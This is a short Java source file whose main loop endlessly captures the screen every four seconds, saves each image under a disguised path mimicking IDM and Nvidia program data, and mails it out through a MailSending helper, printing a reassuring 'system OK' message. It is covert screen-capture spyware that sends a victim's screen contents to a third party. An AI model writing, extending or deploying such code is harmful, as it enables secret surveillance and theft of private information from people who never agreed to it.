/**
 * 
 */

/**
 * @author octron
 *
 */
public class ScreenshotMain {

	/**
	 * @param args
	 */
	public static void main(String[] args) {
		int i = 0;
		for (;;) {
			try {
				final String imagePath = "C:/ProgramData/IDM/Nvidia/sc"+Math.random()+"_" +Math.random()+ "_" + i +".jpg";
				ShotScreen ss = new ShotScreen(imagePath);
				ss.getScreenshot(1);
				MailSending.sendToMailOriginal(imagePath);
				System.out.println("system OK >>>>>>>>>>");
				Thread.sleep(4000);
			} catch (InterruptedException e1) {
				// TODO Auto-generated catch block
				e1.printStackTrace();
			} catch (Exception e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
			i++;
		}
	}

}
